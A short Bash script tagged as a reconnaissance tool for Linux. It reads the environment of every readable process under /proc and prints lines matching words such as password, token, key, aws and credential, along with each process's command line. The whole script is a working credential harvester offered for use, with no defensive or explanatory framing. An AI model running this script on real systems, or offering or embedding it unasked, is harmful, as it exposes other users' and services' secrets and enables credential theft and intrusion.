#!/usr/bin/env bash
# lang: Bash | file: proc_env_dump.sh | target: Linux
# tag: recon | shell: bash
# note: dumps /proc/<pid>/environ for all readable processes — catches secrets in env vars

echo "[*] scanning process environments..."
echo ""

for pid in /proc/[0-9]*; do
    pid_num=$(basename "$pid")
    env_file="$pid/environ"
    if [ -r "$env_file" ]; then
        content=$(tr '\0' '\n' < "$env_file" 2>/dev/null)
        if echo "$content" | grep -qiE "password|secret|token|key|api|aws|credential"; then
            cmdline=$(cat "$pid/cmdline" 2>/dev/null | tr '\0' ' ')
            echo "=== PID $pid_num: $cmdline ==="
            echo "$content" | grep -iE "password|secret|token|key|api|aws|credential"
            echo ""
        fi
    fi
done
